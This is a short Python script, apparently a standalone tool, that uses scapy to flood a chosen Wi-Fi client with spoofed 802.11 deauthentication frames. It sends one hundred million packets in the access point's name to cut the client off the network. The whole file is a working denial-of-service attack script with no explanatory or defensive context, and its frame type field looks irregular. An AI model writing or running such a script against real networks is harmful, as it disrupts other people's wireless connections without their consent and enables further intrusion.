import sys
from scapy.all import *



packet=RadioTap()/Dot11(type=8, subtype=12, addr1=sys.argv[3],addr2=sys.argv[2],addr3=sys.argv[2])/Dot11Deauth()

sendp(packet,iface=sys.argv[1],count=100000000,inter=0.1)
